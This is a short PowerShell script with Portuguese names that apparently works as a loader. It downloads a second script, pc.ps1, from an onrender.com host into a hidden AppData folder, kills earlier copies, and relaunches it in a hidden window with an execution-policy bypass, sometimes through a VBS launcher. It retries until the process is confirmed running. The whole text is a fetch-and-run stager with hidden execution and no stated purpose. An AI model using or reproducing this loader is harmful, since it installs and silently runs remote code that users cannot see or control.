$ErrorActionPreference = "Stop"
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]3072 } catch {}
$ProgressPreference = "SilentlyContinue"
$dir = Join-Path $env:LOCALAPPDATA "OrbeMao"
New-Item -ItemType Directory -Force -Path $dir | Out-Null
$dest = Join-Path $dir "pc.ps1"
Invoke-WebRequest -Uri "https://orbe-xfzn.onrender.com/mao/pc.ps1" -OutFile $dest -UseBasicParsing
Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" | Where-Object {
  $_.CommandLine -like "*OrbeMao*pc.ps1*"
} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
Start-Sleep -Seconds 2
$vbs = Join-Path $dir "ligar.vbs"
$linha = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$dest`""
$vivo = $null
for ($i = 0; $i -lt 3; $i++) {
  if (Test-Path $vbs) {
    Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbs`"" -WindowStyle Hidden
  } else {
    Start-Process -FilePath "powershell.exe" -ArgumentList $linha -WindowStyle Hidden
  }
  Start-Sleep -Seconds 4
  $vivo = Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" | Where-Object {
    $_.CommandLine -like "*OrbeMao*pc.ps1*"
  }
  if ($vivo) { break }
}
if ($vivo) { Write-Output "mao-4-no-ar" } else { Write-Output "mao-4-nao-subiu" }
